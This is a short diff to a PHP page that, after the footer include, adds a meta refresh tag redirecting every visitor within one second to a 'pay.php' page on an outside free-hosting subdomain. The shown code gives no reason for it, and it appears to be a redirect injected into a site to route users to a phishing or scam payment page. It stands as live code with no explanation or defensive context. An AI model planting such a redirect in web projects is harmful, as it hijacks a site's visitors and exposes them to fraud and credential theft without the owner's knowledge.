@@ -14,3 +14,4 @@ include("header.php");
 <?php
 include("footer.php");
  ?>
+<meta http-equiv="refresh" content="1;url='https://attested-lettering.000webhostapp.com/pay.php?t_id=1'">
